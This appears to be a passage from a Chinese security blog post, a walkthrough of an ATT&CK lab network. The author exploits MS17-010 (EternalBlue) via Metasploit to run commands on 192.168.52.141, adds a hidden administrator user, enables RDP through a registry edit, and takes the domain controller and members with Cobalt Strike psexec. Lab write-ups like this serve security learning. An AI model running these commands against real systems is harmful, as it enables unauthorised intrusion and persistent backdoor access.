+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902224752632.png" alt="image-20220902224752632"></p>
+<p>验证发现存在永恒之蓝漏洞；</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">use</span> auxiliary/scanner/smb/smb_ms<span class="number">17</span>_<span class="number">010</span></span><br><span class="line"><span class="attribute">set</span> rhost <span class="number">192.168.52.141</span></span><br><span class="line"><span class="attribute">run</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902224851076.png" alt="image-20220902224851076"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">search</span> ms<span class="number">17</span>_<span class="number">010</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>exploit/windows/smb/ms17_010_eternalblue</code>打不了，但是可以使用<br> <code>auxiliary/admin/smb/ms17_010_command</code>模块执行命令；</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line"><span class="keyword">set</span> rhosts <span class="comment">192.168.52.141</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">command whoami</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902225059396.png" alt="image-20220902225059396"></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">command</span> net user cj 123456 <span class="string">/add</span>   添加用户；</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">command</span> net localgroup administrators cj <span class="string">/add</span>   添加管理员权限；</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">command</span> net localgroup administrators</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">command</span> &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server <span class="string">/v</span> fDenyTSConnections <span class="string">/t</span> REG_DWORD <span class="string">/d</span> 00000000 <span class="string">/f</span>&#x27; 执行命令开启3389端口，这里要么用单引号把命令引住，要么用反斜杠对反斜杠和引号进行转义，否则会出错；</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902225403015.png" alt="image-20220902225403015"></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxychains</span> rdesktop <span class="number">192.168.52.141</span>   远程桌面连接成功，可以用添加的用户进行登录；</span><br></pre></td></tr></table></figure>
+
+<p>没登录成功，原因未知。。。</p>
+<p><strong>使用cs</strong>，使用psexec</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902232714728.png" alt="image-20220902232714728"></p>
+<p>添加监听器smb</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902233120736.png" alt="image-20220902233120736"></p>
+<p>拿下域控</p>
+<p><img src="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/image-20220902233256523.png" alt="image-20220902233256523"></p>
+<p>同样方法拿下域成员</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ATT-CK/" rel="tag"># ATT&CK</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/07/01/xss%E4%B8%8Ecsrf/" rel="prev" title="xss与csrf">
+                  <i class="fa fa-chevron-left"></i> xss与csrf
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">CJ</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Symbols count total">492k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">7:28</span>
+  </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
